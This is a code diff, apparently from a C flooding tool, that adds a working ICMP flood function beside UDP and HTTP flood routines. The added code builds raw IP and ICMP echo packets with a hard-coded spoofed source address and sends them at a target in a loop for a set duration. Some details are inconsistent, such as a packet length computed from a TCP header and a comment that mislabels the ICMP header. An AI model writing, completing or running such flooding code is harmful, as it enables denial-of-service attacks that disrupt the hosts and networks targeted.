@@ -172,6 +172,57 @@ int UDP_flood(char *target,unsigned short port, unsigned int msg_len, time_t dur
 	return 0;
 }
 int ICMP_flood(char *target, unsigned short port, unsigned int msg_len, time_t duration){
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (sock < 0) {
+        perror("Socket error");
+        return 1;
+    }
+    time_t end = time(NULL) + duration;
+    int one = 1;
+    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
+
+    char datagram[4096];
+    memset(datagram, 0, 4096);
+
+    struct iphdr *iph = (struct iphdr *) datagram;
+    struct icmp_header *icmph = (struct icmp_header *) (datagram + sizeof(struct iphdr));
+    struct sockaddr_in dest;
+
+    dest.sin_family = AF_INET;
+    dest.sin_port = htons(port);
+    dest.sin_addr.s_addr = inet_addr(target);
+
+    // Fill in IP Header
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+    iph->id = htons(54321);
+    iph->frag_off = 0;
+    iph->ttl = 255;
+    iph->protocol = IPPROTO_ICMP;
+    iph->check = 0;
+    iph->saddr = inet_addr("192.168.1.2");
+    iph->daddr = dest.sin_addr.s_addr;
+
+    iph->check = checksum((unsigned short *) datagram, iph->tot_len);
+
+    // Fill in TCP Header
+    icmph->type = 8;
+    icmph->code = 0;
+    icmph->checksum = 0;
+    u_int16_t check = checksum((unsigned short *)icmph, sizeof(struct icmp_header));
+    icmph->checksum = check;
+    while(time(NULL)<end){
+       if (sendto(sock, datagram, iph->tot_len, 0,
+               (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+	perror("Send failed");
+	return 2;
+       } else {
+           printf("ICMP echo request packet sent\n");
+       }
+   }
+    close(sock);
     return 0;
 }
 int HTTP_flood(char *target, unsigned short port, unsigned int msg_len, time_t duration){
